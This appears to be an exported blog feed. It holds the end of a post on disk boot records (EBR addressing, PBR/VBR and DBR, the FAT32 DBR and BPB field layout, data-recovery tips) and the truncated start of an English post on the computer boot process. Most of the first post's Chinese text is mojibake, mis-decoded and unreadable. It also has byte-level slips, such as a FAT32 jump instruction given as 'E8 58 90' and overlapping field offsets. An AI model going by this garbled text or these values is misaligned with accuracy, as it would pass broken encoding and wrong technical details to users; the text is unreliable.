ä¸ªä¸»åˆ†åŒºæˆ–è€… 3 ä¸ªä¸»åˆ†åŒºï¼‹ 1ä¸ªæ‰©å±•åˆ†åŒºï¼Œä¹Ÿå°±æ˜¯è¯´æ‰©å±•åˆ†åŒºåªèƒ½æœ‰ä¸€ä¸ªï¼Œç„¶åå¯ä»¥å†ç»†åˆ†ä¸ºå¤šä¸ªé€»è¾‘åˆ†åŒºã€‚</li><li>æ‰€æœ‰æ‰©å±•åˆ†åŒºå¼€å§‹ä½ç½®çš„ç›¸å¯¹åœ°å€å‡ä»ç¬¬ 1 ä¸ªæ‰©å±•åˆ†åŒºå¼€å§‹ã€‚</li><li>è®¡ç®—æ‰©å±•åˆ†åŒºçš„ç»å¯¹åœ°å€éœ€ä»åŠ ä¸Š EBR1 çš„ç»å¯¹åœ°å€ï¼ˆç‰©ç†æ‰‡åŒºå·ï¼‰ã€‚</li></ol><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422201756.png"alt="EBR Address" /><figcaption aria-hidden="true">EBR Address</figcaption></figure><h2 id="pbr">PBR</h2><blockquote><p>The partition boot record is the first block of any bootablepartition. It is also sometimes referred to as the Volume Boot Record(VBR)</p></blockquote><p>å½“ç„¶ï¼Œå·ä¸åˆ†åŒºè¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼Œå‚è€ƒ <ahref="https://www.zhihu.com/question/38843560">æ“ä½œç³»ç»Ÿæ¦‚å¿µä¸­ï¼Œåˆ†åŒºå’Œå·çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</a></p><p>åˆ†åŒºå¼•å¯¼è®°å½•(Partition Boot Record), åˆç§°åˆ†åŒºå¼•å¯¼æ‰‡åŒºï¼ˆPartition BootSector)ï¼Œå·å¼•å¯¼æ‰‡åŒº(Volume Boot Sector), å·å¼•å¯¼è®°å½•(VBR, Volume BootRecord), å®ƒæ˜¯ç”± FORMAT é«˜çº§æ ¼å¼åŒ–å‘½ä»¤å†™åœ¨å„ä¸ªåˆ†åŒºå¼€å§‹å¤„ç¬¬ä¸€ä¸ªæ‰‡åŒºã€‚</p><p>å½“è¯¥åˆ†åŒºä¸ºæ´»åŠ¨åˆ†åŒºæ—¶ï¼Œå…¶ PBR åˆç§°ï¼Œ DBRï¼ˆDOS Boot Recordï¼ŒDOSå¼•å¯¼è®°å½•ï¼‰ï¼Œ OBRï¼ˆOS Boot Recordï¼Œæ“ä½œç³»ç»Ÿå¼•å¯¼è®°å½•ï¼‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç”±äº DBRçš„å†…å®¹ä¸æ“ä½œç³»ç»Ÿç‰ˆæœ¬ï¼Œæ–‡ä»¶ç³»ç»Ÿæœ‰å…³ï¼ŒDBR ä¹Ÿå¯ä»¥è¢«ç§°ä¹‹ä¸º "Boot Sectoræ–‡ä»¶ç³»ç»Ÿå"ï¼Œä¾‹å¦‚ï¼šâ€œBOOT Sector FAT32â€ã€â€œBOOT Sector NTFSâ€</p><p>å½“ç„¶ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šç›´æ¥å°†æ‰€æœ‰åˆ†åŒºï¼ˆæ— è®ºæ´»åŠ¨ä¸å¦ï¼‰PBR éƒ½å«åšDBRï¼Œäº†è§£å³å¯ã€‚</p><p>DBR ç”¨æ¥å¼•å¯¼ç³»ç»Ÿå¯»æ‰¾æ¿€æ´»åˆ†åŒºæ ¹ç›®å½•ä¸‹çš„ NTLDRï¼ˆXPï¼‰ã€bootmgrï¼ˆWin7aboveï¼‰ã€grldrï¼ˆGrubï¼‰ã€btldr.mbrï¼ˆBootLinkï¼‰ç­‰å¯ç”¨äºå¼•å¯¼æ“ä½œç³»ç»Ÿçš„ç¨‹åºã€‚æ¯ä¸ªåˆ†åŒºéƒ½æœ‰å¼•å¯¼æ‰‡åŒºï¼Œä½†åªæœ‰è¢«è®¾ä¸ºæ´»åŠ¨åˆ†åŒºçš„PBR æ‰èƒ½åœ¨å¼•å¯¼è¿‡ç¨‹ä¸­è·å¾—æ§åˆ¶æƒï¼ŒåŠ è½½ç³»ç»Ÿæ–‡ä»¶åˆ°å†…å­˜ã€‚</p><ul><li>åœ¨å¯¹ç¡¬ç›˜åˆ†åŒºä¹‹åï¼Œæ¯ä¸€ä¸ªåˆ†åŒºå‡æœ‰ä¸€ä¸ª DBR ä¸ä¹‹å¯¹åº”ã€‚DBRä½äºæ¯ä¸ªåˆ†åŒºçš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œå¤§å°ä¸º 512 å­—èŠ‚ã€‚</li><li>DBR å†…å®¹æ ¹æ®æ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¸åŒï¼Œç£ç›˜ç±»å‹ä¸åŒè€Œæœ‰æ‰€å˜åŒ–</li><li>æ˜¯å¯åˆ†åŒºè®¾å¤‡çš„æ¯ä¸ªåˆ†åŒºå†…çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºã€‚</li></ul><p>å®ƒå¯ä»¥æœ‰ä¸¤ä¸ªä½œç”¨:</p><ol type="1"><li>å½“å…¶ä¸ºæ´»åŠ¨åˆ†åŒºçš„ PBR, å³ï¼šDBR æ—¶ï¼Œå…·æœ‰åŠ è½½ç³»ç»Ÿæ–‡ä»¶ï¼Œä»è€Œå¼•å¯¼æ“ä½œç³»ç»Ÿçš„ä½œç”¨ã€‚è€Œéæ´»åŠ¨åˆ†åŒºçš„å¯¹åº”éƒ¨åˆ†çš„æ„ä¹‰æ˜¯å­˜å‚¨DBR çš„å¤‡ä»½</li><li>ä½œä¸ºä»»ä¸€ä¸ªä¸»åˆ†åŒºçš„PBRï¼Œå®ƒè´Ÿè´£ç®¡ç†æŸä¸ªå…·ä½“çš„åˆ†åŒºï¼Œå­˜å‚¨ç€åˆ†åŒºçš„ç›¸å…³ä¿¡æ¯ã€‚</li></ol><h3 id="dbr">DBR</h3><p>ä¸»å¼•å¯¼ç¨‹åºæ‰§è¡Œå®Œ MBRä¸­çš„å¼•å¯¼ä»£ç åï¼Œå°†ç³»ç»Ÿæ§åˆ¶æƒäº¤ç»™æ´»åŠ¨åˆ†åŒºçš„å¼•å¯¼è®°å½•DBRï¼Œç”¨æ¥å¼•å¯¼æ“ä½œç³»ç»Ÿã€‚</p><ul><li>æ¯ä¸ªåˆ†åŒºè¢«èµ‹äºˆä¸€ä¸ªç›˜ç¬¦ï¼Œå³é€»è¾‘ç›˜ç¬¦</li><li>æ¯ä¸ªåˆ†åŒºé€»è¾‘æ‰‡åŒºä»â€œ0â€å¼€å§‹ç¼–å·</li><li>é«˜çº§æ ¼å¼åŒ–ç¨‹åºå°†å¼•å¯¼è®°å½• DBR å†™åˆ°â€œ0â€æ‰‡åŒºï¼ŒDOS å¼•å¯¼æ‰‡åŒºï¼Œ</li></ul><h3 id="dbr-layout">DBR Layout</h3><p>æ“ä½œç³»ç»Ÿå¼•å¯¼è®°å½• DBRï¼ˆDOS Boot Recordï¼‰é€šå¸¸ä½äºç¡¬ç›˜çš„ 1 æŸ±é¢ 0 ç£é“ 1æ‰‡åŒºï¼Œ<strong>å…¶é€»è¾‘æ‰‡åŒºå·ä¸º0</strong>ï¼Œæ˜¯æ“ä½œç³»ç»Ÿå¯ä»¥ç›´æ¥è®¿é—®çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œå› æ­¤ï¼Œå¼•å¯¼æ‰‡åŒºåˆå¸¸å¸¸æŒ‡DBRã€‚</p><p>ä»¥ Windows FAT32 DBR ä¸ºä¾‹åˆ†æï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422225145.png"alt="FAT32 DBR" /><figcaption aria-hidden="true">FAT32 DBR</figcaption></figure><p>ä¾æ¬¡åŒ…æ‹¬ä»¥ä¸‹éƒ¨åˆ†ï¼š</p><ol type="1"><li><p>è·³è½¬æŒ‡ä»¤ï¼Œè®©ç¨‹åºæ‰§è¡Œæµç¨‹è·³è½¬åˆ°å¼•å¯¼ä»£ç ï¼ˆ3 ä¸ªå­—èŠ‚ï¼‰</p><p>å¼€å¤´çš„è·³è½¬æŒ‡ä»¤å¯ä»¥ç”¨æ¥åŒºåˆ†æ–‡ä»¶ç³»ç»Ÿï¼š</p><ol type="1"><li>FAT16 æ˜¯ EB 3C 90</li><li>FAT32 æ˜¯ E8 58 90</li><li>NTFS æ˜¯ EB 52 90</li></ol></li><li><p>å‚å•†æ ‡è¯†å’Œç³»ç»Ÿç‰ˆæœ¬å·ï¼ˆ03~0Aï¼‰ï¼ˆä¹Ÿç§°ä¸º OEMï¼‰ï¼Œ8 ä¸ªå­—èŠ‚</p><p>å…¶å†…å®¹ç”±åˆ›å»ºè¯¥æ–‡ä»¶ç³»ç»Ÿçš„ OEM å‚å•†å…·ä½“å®‰æ’ã€‚</p></li><li><p>ç£ç›˜å‚æ•°å—(0BH-59H å…±å ç”¨ 79 ä¸ªå­—èŠ‚)ï¼Œ å³: BPBï¼ŒBIOS ParameterBlock</p><p>BPB ååˆ†é‡è¦ï¼Œç”±æ­¤å¯ç®—å‡ºé€»è¾‘åœ°å€ä¸ç‰©ç†åœ°å€ã€‚ <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200422223052.png"alt="BPB" /></p><ol type="1"><li><p>0BH ï½ 0CHï¼š<strong>æ¯æ‰‡åŒºå­—èŠ‚æ•°</strong></p><p>æ¯æ‰‡åŒºå­—èŠ‚æ•°è®°å½•æ¯ä¸ªé€»è¾‘æ‰‡åŒºçš„å¤§å°ï¼Œå…¶å¸¸è§å€¼ä¸º 512 å­—èŠ‚ï¼Œä½† 512å­—èŠ‚å¹¶ä¸æ˜¯å›ºå®šå€¼ã€‚è¯¥å€¼å¯ä»¥ç”±ç¨‹åºå®šä¹‰ï¼Œåˆæ³•å€¼åŒ…æ‹¬ 512ã€1024ã€2048 å’Œ 4096å­—èŠ‚ã€‚</p></li><li><p>0DHï¼šæ¯ç°‡æ‰‡åŒºæ•°</p><p>â€œç°‡â€æ˜¯ FAT12ã€FAT16 ä»¥åŠ FAT32æ–‡ä»¶ç³»ç»Ÿä¸‹æ•°æ®çš„æœ€å°å­˜å‚¨å•å…ƒï¼Œä¸€ä¸ªâ€œç°‡â€ç”±ä¸€ç»„è¿ç»­çš„æ‰‡åŒºç»„æˆã€‚</p></li><li><p>0EH ï½ 0FHï¼š<strong>DBR ä¿ç•™æ‰‡åŒºæ•°</strong></p><p>DBR ä¿ç•™æ‰‡åŒºæ•°æ˜¯æŒ‡ DBR æœ¬èº«å ç”¨çš„æ‰‡åŒºä»¥åŠå…¶åä¿ç•™æ‰‡åŒºçš„æ€»å’Œï¼Œä¹Ÿå°±æ˜¯DBR åˆ° FAT1 ä¹‹é—´æ‰‡åŒºæ€»æ•°ï¼Œæˆ–è€…è¯´æ˜¯ FAT1 çš„å¼€å§‹æ‰‡åŒºå·ï¼ˆé€»è¾‘æ‰‡åŒºå·ï¼‰ã€‚ä¹Ÿç§°ä½œ FATè¡¨ä½ç½®çš„åç§»é‡ï¼Œå½“ç„¶è¿™é‡Œæ˜¯ç›¸å¯¹äºè¯¥åˆ†åŒºçš„åç§»é‡ï¼ˆæ²¡æœ‰åŒ…æ‹¬è¯¥åˆ†åŒºå‰é¢çš„éƒ¨åˆ†ï¼‰ã€‚<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423090210.png"alt="ç¤ºä¾‹" /> ä¿ç•™æ‰‡åŒºæ•° = FAT1 èµ·å§‹æ‰‡åŒº - å¼•å¯¼æ‰‡åŒºï¼ˆDBRï¼‰èµ·å§‹æ‰‡åŒº =622020802-622020798 = 4</p></li><li><p>10Hï¼š<strong>FAT è¡¨ä¸ªæ•°</strong> FAT è¡¨ä¸ªæ•°æè¿°äº†è¯¥æ–‡ä»¶ç³»ç»Ÿæœ‰å‡ ä¸ªFAT è¡¨ï¼Œä¸€èˆ¬åœ¨ FAT æ–‡ä»¶ç³»ç»Ÿä¸­éƒ½æœ‰ä¸¤ä¸ª FATï¼ŒFAT1 å’Œ FAT2ã€‚å€¼é»˜è®¤ä¸º02</p></li><li><p>11H ï½ 12H:æœªç”¨</p><p>è¿™ä¸ªå‚æ•°åœ¨ FAT16 ä¸­ç”¨æ¥è¡¨ç¤º FDT ä¸­æœ€å¤§æ‰€èƒ½å®¹çº³çš„ç›®å½•é¡¹æ•°ï¼ˆRootEntriesï¼‰ï¼Œä¸€èˆ¬ä¸º 0x0200=512ï¼ŒFAT32 æ²¡æœ‰å›ºå®šçš„FDTï¼Œæ‰€ä»¥ä¸ç”¨è¿™ä¸ªå‚æ•°ã€‚</p></li><li><p>13H ï½ 14Hï¼šæ‰‡åŒºæ€»æ•°</p><p>è¿™ä¸¤ä¸ªå­—èŠ‚åœ¨ FAT16 ä¸­ç”¨æ¥è¡¨ç¤ºå°äº 32MB çš„åˆ†åŒºçš„æ‰‡åŒºæ€»æ•°ï¼ŒFAT32çš„æ€»æ˜¯å¤§äº 32MBï¼Œæ‰€ ä»¥ä¸ç”¨è¿™ä¸ªå‚æ•°ã€‚</p></li><li><p>15Hï¼šç£ä»‹è´¨æè¿°ç¬¦</p><p>ä»‹è´¨æè¿°ç¬¦æ˜¯æè¿°ç£ç›˜ä»‹è´¨çš„å‚æ•°ï¼Œæ ¹æ®ç£ç›˜æ€§è´¨çš„ä¸åŒï¼Œå–å€¼ä¸åŒã€‚å¦‚<strong>ç¡¬ç›˜ä¸ºF8</strong>ã€‚</p></li><li><p>16H ï½ 17Hï¼šæœªç”¨</p><p>è¿™ä¸¤ä¸ªå­—èŠ‚åœ¨ FAT16 ä¸­ç”¨æ¥è¡¨ç¤ºæ¯ä¸ª FAT è¡¨åŒ…å«çš„æ‰‡åŒºæ•°ï¼ŒFAT32æœªç”¨ã€‚</p></li><li><p>18H ï½ 19Hï¼šæ¯ç£é“æ‰‡åŒºæ•°</p><p>è¿™æ˜¯é€»è¾‘ C/H/S ä¸­çš„ä¸€ä¸ªå‚æ•°ï¼Œå…¶å€¼ä¸€èˆ¬ä¸º 63ã€‚</p></li><li><p>1AH ï½ 1BHï¼šç£å¤´æ•°</p></li><li><p>1CH ï½ 1FHï¼š<strong>éšè—æ‰‡åŒºæ•°</strong></p><p>éšè—æ‰‡åŒºæ•°æ˜¯æŒ‡æœ¬åˆ†åŒºä¹‹å‰ï¼ˆç›¸å¯¹ï¼‰ä½¿ç”¨çš„æ‰‡åŒºæ•°ï¼Œ<strong>è¯¥å€¼ä¸åˆ†åŒºè¡¨ä¸­æ‰€æè¿°çš„è¯¥åˆ†åŒºçš„èµ·å§‹æ‰‡åŒºå·ä¸€è‡´</strong>ã€‚å¯¹äºä¸»ç£ç›˜åˆ†åŒºæ¥è®²ï¼Œæ˜¯MBR åˆ°è¯¥åˆ†åŒº DBR ä¹‹é—´çš„æ‰‡åŒºæ•°ï¼›å¯¹äºæ‰©å±•åˆ†åŒºä¸­çš„é€»è¾‘åˆ†åŒºæ¥è®²ï¼Œæ˜¯å…¶ EBRåˆ°è¯¥åˆ†åŒº DBR ä¹‹é—´çš„æ‰‡åŒºæ•°ã€‚</p><p>çœ‹ä¸æ‡‚ï¼Ÿ æ¥ç€çœ‹ï¼Œä¸‹é¢æœ‰å›¾ã€‚</p></li><li><p>20H ï½ 23Hï¼šæ‰‡åŒºæ€»æ•°</p><p>æ‰‡åŒºæ€»æ•°æ˜¯æŒ‡åˆ†åŒºçš„æ€»æ‰‡åŒºæ•°ï¼Œä¹Ÿå°±æ˜¯ FAT32 åˆ†åŒºçš„å¤§å°ã€‚</p></li><li><p>24H ï½ 27Hï¼šæ¯ä¸ª FAT æ‰‡åŒºæ•°</p><p>è¿™å››ä¸ªå­—èŠ‚ç”¨æ¥è®°å½• FAT32 åˆ†åŒºä¸­æ¯ä¸ª FAT è¡¨å ç”¨çš„æ‰‡åŒºæ•°ã€‚</p></li><li><p>28H ï½ 29Hï¼šæ ‡å¿—</p><p>è¿™ä¸¤ä¸ªå­—èŠ‚ç”¨äºè¡¨ç¤º FAT32 æ˜¯å¦å¯ç”¨ï¼Œå½“å…¶äºŒè¿›åˆ¶æœ€é«˜ä½ç½® 1 æ—¶ï¼Œè¡¨ç¤ºåªæœ‰FAT1 å¯ç”¨ï¼Œå¦åˆ™ FAT2 ä¹Ÿå¯ç”¨ã€‚</p></li><li><p>2AH ï½ 2BHï¼šç‰ˆæœ¬ã€‚é€šå¸¸ä¸º 0ã€‚</p></li><li><p>2CH ï½ 2FHï¼š<strong>æ ¹ç›®å½•é¦–ç°‡å·</strong></p><p>åˆ†åŒºåœ¨æ ¼å¼åŒ–ä¸º FAT32 æ–‡ä»¶ç³»ç»Ÿæ—¶ï¼Œæ ¼å¼åŒ–ç¨‹åºä¼šåœ¨æ•°æ®åŒºä¸­æŒ‡æ´¾ä¸€ä¸ªç°‡ä½œä¸ºFAT32 çš„æ ¹ç›®å½•åŒºçš„å¼€å§‹ï¼Œå¹¶æŠŠè¯¥ç°‡å·è®°å½•åœ¨ BPBä¸­ã€‚<strong>é€šå¸¸æ˜¯æŠŠæ•°æ®åŒºçš„ç¬¬ä¸€ä¸ªç°‡åˆ†é…ç»™æ ¹ç›®å½•ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯ 2å·ç°‡ã€‚å€¼å›ºå®šä¸º 02</strong></p></li><li><p>30H ï½ 33Hï¼šæ–‡ä»¶ç³»ç»Ÿä¿¡æ¯æ‰‡åŒºå·ã€‚</p><p>FAT32 æ–‡ä»¶ç³»ç»Ÿåœ¨ DBRçš„ä¿ç•™æ‰‡åŒºä¸­å®‰æ’äº†ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¿¡æ¯æ‰‡åŒºï¼Œç”¨ä»¥è®°å½•æ•°æ®åŒºä¸­ç©ºé—²ç°‡çš„æ•°é‡åŠä¸‹ä¸€ä¸ªç©ºé—²ç°‡çš„ç°‡å·ã€‚è¯¥æ‰‡åŒºä¸€èˆ¬åœ¨åˆ†åŒºçš„1 å·æ‰‡åŒºï¼Œä¹Ÿå°±æ˜¯ç´§è·Ÿåœ¨ DBR åçš„ä¸€ä¸ªæ‰‡åŒºã€‚</p></li><li><p>32Hï¼šDBR å¤‡ä»½æ‰‡åŒºå·</p><p>FAT32 æ–‡ä»¶ç³»ç»Ÿåœ¨ DBR çš„ä¿ç•™æ‰‡åŒºä¸­å®‰æ’äº†ä¸€ä¸ª DBR çš„å¤‡ä»½ï¼Œä¸€èˆ¬åœ¨ 6å·æ‰‡åŒºï¼Œä¹Ÿå°±æ˜¯åˆ†åŒºçš„ç¬¬ 7 ä¸ªæ‰‡åŒºã€‚è¯¥å¤‡ä»½æ‰‡åŒºä¸åŸ DBRæ‰‡åŒºçš„å†…å®¹å®Œå…¨ä¸€æ ·ï¼Œå¦‚æœåŸ DBR é­åˆ°ç ´åï¼Œå¯ä»¥ç”¨å¤‡ä»½æ‰‡åŒºä¿®å¤ã€‚å€¼é»˜è®¤ä¸º06</p></li><li><p>34H ï½ 3FH:æœªç”¨ã€‚è¿™ 12 ä¸ªå­—èŠ‚ä¿ç•™ä¸ç”¨ã€‚</p></li><li><p>40H:BIOS é©±åŠ¨å™¨å·</p><p>è¿™æ˜¯ BIOS çš„ INT 13H æ‰€æè¿°çš„è®¾å¤‡å·ç ï¼Œä¸€èˆ¬ä» 80H å¼€å§‹ç¼–å·ã€‚</p></li><li><p>41H:æœªç”¨ã€‚è¿™ä¸¤ä¸ªå­—èŠ‚ä¸ä½¿ç”¨ï¼Œä¸º 0ã€‚</p></li><li><p>42Hï¼šæ‰©å±•å¼•å¯¼æ ‡è®°</p><p>æ‰©å±•å¼•å¯¼æ ‡è®° ç”¨æ¥ç¡®è®¤åé¢çš„ä¸‰ä¸ªå‚æ•°æ˜¯å¦æœ‰æ•ˆï¼Œä¸€èˆ¬å€¼ä¸º 29Hã€‚</p></li><li><p>43H ï½ 46Hï¼šå·åˆ—åºå·</p><p>å·åˆ—åºå·æ˜¯æ ¼å¼åŒ–ç¨‹åºåœ¨åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿæ—¶ç”Ÿæˆçš„ä¸€ç»„ 4å­—èŠ‚çš„éšæœºæ•°å€¼ã€‚</p></li><li><p>47H ï½ 51H:å·æ ‡</p><p>å·æ ‡æ˜¯ç”±ç”¨æˆ·åœ¨åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿæ—¶æŒ‡å®šçš„ä¸€ä¸ªå·çš„åç§°ï¼ŒåŸæ¥çš„ç³»ç»ŸæŠŠå·æ ‡è®°å½•åœ¨è¿™ä¸ªåœ°å€å¤„ï¼Œç°åœ¨çš„ç³»ç»Ÿå·²ç»ä¸å†ä½¿ç”¨è¿™ä¸ªåœ°å€è®°å½•å·æ ‡ï¼Œè€Œæ˜¯ç”±ä¸€ä¸ªç›®å½•é¡¹æ¥ç®¡ç†å·æ ‡ã€‚</p></li><li><p>52H ï½ 59Hï¼š<strong>æ–‡ä»¶ç³»ç»Ÿç±»å‹</strong></p><p>BPB æœ€åä¸€ä¸ªå‚æ•°ï¼Œç›´æ¥ç”¨ ASCâ…¡ ç è®°å½•å½“å‰åˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ã€‚ä¸€èˆ¬FAT32 çš„æ ‡è¯†å‡å¡«å†™ä¸ºï¼š<code>46 41 54 33 32 20 20 20</code></p></li></ol></li><li><p>DOS å¼•å¯¼ç¨‹åºï¼ˆ5A~1FDï¼‰420 å­—èŠ‚</p><p>å…¶ä¸­ DOS å¼•å¯¼ç¨‹åºå®Œæˆ DOS ç³»ç»Ÿæ–‡ä»¶ï¼ˆIO.SYSï¼ŒMSDOS.SYSï¼‰çš„å®šä½ä¸è£…è½½<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423091124.png"alt="DOS å¼•å¯¼ç¨‹åº" /></p></li><li><p>ç»“æŸæ ‡å¿— 55AA</p></li></ol><p>å¯¹äºé‡‡ç”¨ MBR åˆ†åŒºã€FAT16 æ–‡ä»¶ç®¡ç†ç³»ç»Ÿçš„ç¡¬ç›˜è€Œè¨€ï¼Œå…¶å¤§è‡´ç»“æ„å¦‚ä¸‹:ä¸‹å›¾ä¸»è¦åŒ…å«ä¸»å¼•å¯¼è®°å½•å’Œä¸€ä¸ªä¸»åˆ†åŒºçš„ç»“æ„ç¤ºä¾‹ï¼Œå…¶ä»–åˆ†åŒºçš„ç»“æ„ç±»ä¼¼ï¼Œä¸å†å±•å¼€ã€‚</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200825171743.png"alt="20200825171743" /><figcaption aria-hidden="true">20200825171743</figcaption></figure><p>å…³äº FAT åœ¨è¿™é‡Œå…ˆç®€å•æä¸€ä¸‹ï¼Œåé¢æœ‰åšæ–‡è¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚</p><p>å¯¹ä½¿ç”¨ DOS åˆ†åŒºä½“ç³»çš„ç£ç›˜è¿›è¡Œæ•°æ®æ¢å¤åŠå–è¯æ—¶ï¼š</p><ol type="1"><li>åŸºäº DOS åˆ†åŒºç³»ç»Ÿç£ç›˜å¤§éƒ½èµ·å§‹äº MBR æ‰‡åŒºã€‚MBR åªå ç”¨ 1ä¸ªæ‰‡åŒºï¼Œä¸æ–‡ä»¶ç³»ç»Ÿåˆ†åŒºé—´æœ‰ 62 ä¸ªç©ºé—²æ‰‡åŒº</li><li>ç†è®ºä¸Š EBRåªå…è®¸æœ‰ä¸¤ä¸ªåˆ†åŒºè¡¨é¡¹ï¼Œä¸€ä¸ªç”¨äºæè¿°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿåˆ†åŒºï¼Œå¦ä¸€ä¸ªæè¿°æ‰©å±•åˆ†åŒºã€‚</li><li>ä¸»åˆ†åŒºè¡¨è¢«ç ´åæ—¶ï¼Œå¯ä½¿ç”¨ Winhexè¯†åˆ«å„ä¸ªåˆ†åŒºã€‚ä¹Ÿå¯è®¡ç®—ä¸»åˆ†åŒºå„ä¸ªè¡¨é¡¹å€¼ï¼Œç›´æ¥å¡«å…¥ä¸»åˆ†åŒºè¡¨ã€‚</li><li>ä¸æ˜¯æ‰€æœ‰ç³»ç»Ÿå¯¹åˆ†åŒºç±»å‹è¿›è¡Œå¼ºåˆ¶æ‰§è¡Œã€‚æ¯”å¦‚å°† FAT32 çš„ç±»å‹å€¼æ”¹ä¸º Linuxç±»å‹å€¼ï¼ŒWinXP ä¾ç„¶å¯æ­£å¸¸åŠ è½½è¯¥åˆ†åŒºã€‚</li><li>Windows å¯¹ç±»å‹å€¼ä¸ºéšè—ç±»å‹åˆ†åŒºä¸¥æ ¼æ‰§è¡Œï¼Œä¸è¿›è¡ŒåŠ è½½ã€‚ä½†å¯é€šè¿‡ LinuxåŠ è½½ã€‚</li><li>æœ‰äº›ç‰ˆæœ¬åªæ”¯æŒä¸€ä¸ªä¸»æ–‡ä»¶ç³»ç»Ÿåˆ†åŒºè¡¨é¡¹ã€‚</li><li>åˆ†åŒºè¡¨é“¾è¢«ç ´åæ—¶ï¼Œå¯ä»¥é€šè¿‡â€œ55AAâ€é‡æ–°å®šä½åˆ†åŒºè¡¨é“¾ä¸­å„ä¸ªåˆ†åŒºè¡¨çš„ä½ç½®ã€‚</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="http://glennastory.net/boot/pbr.html">Partition Boot Record(PBR)</a></li><li><a href="https://en.wikipedia.org/wiki/Master_boot_record">Masterboot record</a></li><li><a href="https://en.wikipedia.org/wiki/Partition_type">Partitiontype</a></li><li><ahref="https://blog.csdn.net/ww1473345713/article/details/51602825">Linuxå¼•å¯¼æ‰‡åŒº(boot sector)çš„ç»“æ„</a></li><li><ahref="https://jaydenz.github.io/2018/05/05/4.Linux%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/">Linuxç³»ç»Ÿå¯åŠ¨æµç¨‹</a></li><li><ahref="https://zh.wikipedia.org/wiki/%E4%B8%BB%E5%BC%95%E5%AF%BC%E8%AE%B0%E5%BD%95#%E4%B8%BB%E5%BC%95%E5%AF%BC%E6%89%87%E5%8C%BA%E7%9A%84%E8%AF%BB%E5%8F%96%E6%B5%81%E7%A8%8B">ä¸»å¼•å¯¼è®°å½•</a></li><li><a href="https://www.dddps.com/pc/hardware/125.html">ç¡¬ç›˜åˆ†åŒº FAT32æ–‡ä»¶ç³»ç»Ÿ DBR è¯¦è§£åŠæ‰‹å·¥é‡å»º</a></li><li><ahref="https://whatis.techtarget.com/definition/Master-Boot-Record-MBR">DefinitionMaster Boot Record (MBR)</a></li><li><a href="https://www.cnblogs.com/lsgxeva/p/11183693.html">BIOS å°†MBR è¯»å…¥ 0x7C00 åœ°å€å¤„(x86 å¹³å°ä¸‹)</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Boot </tag>
            
            <tag> Computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Booting Process of Computer</title>
      <link href="/blog/2020/04/24/os/1.bootprocess/"/>
      <url>/blog/2020/04/24/os/1.bootprocess/</url>
      
        <content type="html"><![CDATA[<p>Booting (also known as booting up) is the initial set of operationsthat a computer system performs when electrical power is switched on.The process begins when a computer that has been turned off isre-energized, and ends when the computer is ready to perform its normaloperations. It typically involves performing power-on self-test,locating and initializing peripheral devices, and then finding, loadingand starting an operating system.</p><p>The computer term <strong>boot</strong> is short for bootstrap orbootstrap load and derives from the phrase to pull oneself up by oneâ€™sbootstraps. The usage calls attention to the paradox that a computercannot run without first loading software but some software must runbefore any software can be loaded.</p><h2 id="the-order-of-booting">The order of booting</h2><h2 id="bios">1. BIOS</h2><p>Early computers used a variety of ad-hoc methods to get a fragment ofsoftware into memory to solve this problem. The invention of integratedcircuit Read-only memory (ROM) of various types solved the paradox byallowing computers to be shipped with a start up program that could notbe erased, but growth in the size of ROM has allowed ever more elaboratestart up procedures to be implemented. Besides, the program in ROM iscall BIOS(Basic Input/Output System).</p><h3 id="post">1.1 POST</h3><h4 id="keypoint">KEYPOINT</h4><p>Once the computerâ€™s power is first turned on, it will read BIOS(BasicInput/Output System) from ROM(read-only memory) which will test thecomputer to see if the fundamental conditions to boot itselt correctlyis met.</p><h4 id="elaboration">Elaboration</h4><p>In order for a computer to successfully boot, its <strong>BIOS,operating system and hardware</strong> components must all be workingproperly; failure of any one of these three elements will likely resultin a failed boot sequence.</p><p>When the computerâ€™s power is first turned on, the CPU initializesitself, which is triggered by a series of clock ticks generated by thesystem clock. Part of the CPUâ€™s initialization is to look to thesystemâ€™s ROM BIOS for its first instruction in the startup program. TheROM BIOS stores the first instruction, which is the instruction to runthe <strong>power-on self test (POST)</strong>, in a predeterminedmemory address.</p><p>POST begins by checking the BIOS chip and then tests CMOS RAM. If thePOST does not detect a battery failure, it then continues to initializethe CPU, checking the inventoried hardware devices (such as the videocard), secondary storage devices, such as hard drives and floppy drives,ports and other hardware devices, such as the keyboard and mouse, toensure they are functioning properly.</p><p>Most BIOS chips use a system of beep codes to indicate the POSTstatus to the user and each BIOS chipset uses a different code.</p><h3 id="boot-sequence">1.2. Boot sequence</h3><p>Once the POST has determined that all components are functioningproperly and the CPU has successfully initialized, the BIOS looks for anOS to load.</p><p>The BIOS typically looks to the CMOS chip to tell it where to findthe OS, and in most PCs, the OS loads from the C drive on the hard driveeven though the BIOS has the capability to load the OS from a floppydisk, CD or ZIP drive.</p><p>The order of drives that the CMOS looks to in order to locate the OSis called the <strong>boot sequence</strong>, which can be changed byaltering the CMOS setup</p><p>This is what many people including me who installed Multisystem 